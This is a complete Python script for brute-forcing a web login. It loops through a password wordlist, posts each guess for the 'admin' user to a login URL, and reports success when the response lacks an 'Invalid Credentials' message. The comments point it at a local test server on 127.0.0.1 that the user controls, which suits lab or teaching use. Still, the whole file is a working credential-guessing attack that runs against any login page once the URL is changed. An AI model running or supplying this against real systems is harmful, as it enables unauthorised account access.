import requests # type: ignore

# The URL of the target login page (this should be a local or test page you control)
target_url = "http://127.0.0.1:5000/login"

# The username you are trying to guess the password for
username = "admin"

# Path to your wordlist file
wordlist_file = "passwords.txt"

def crack_password():
    try:
        with open(wordlist_file, 'r') as file:
            for password in file:
                password = password.strip()  # Remove any whitespace or newlines

                # Create the data payload for the login attempt
                data = {'username': username, 'password': password, 'submit': 'Login'}

                print(f"[*] Trying password: {password}")

                # Send the POST request to the login page
                response = requests.post(target_url, data=data)

                # Check for a successful login. This depends on the target's response.
                # A common indicator is a redirect or a specific success message in the content.
                # In this example, we'll check for the absence of an "Invalid Credentials" message.
                if "Invalid Credentials" not in response.text:
                    print(f"[+] Found correct password: {password}")
                    return True  # Password found, exit the function

    except FileNotFoundError:
        print(f"[-] Error: Wordlist file '{wordlist_file}' not found.")
    except requests.exceptions.ConnectionError:
        print("[-] Error: Failed to connect to the target URL. Make sure the server is running.")

    return False  # Password not found after trying all words

if __name__ == "__main__":
    if crack_password():
        print("[*] Project finished. Password was found.")
    else:
        print("[-] Project finished. Password was not found in the wordlist.")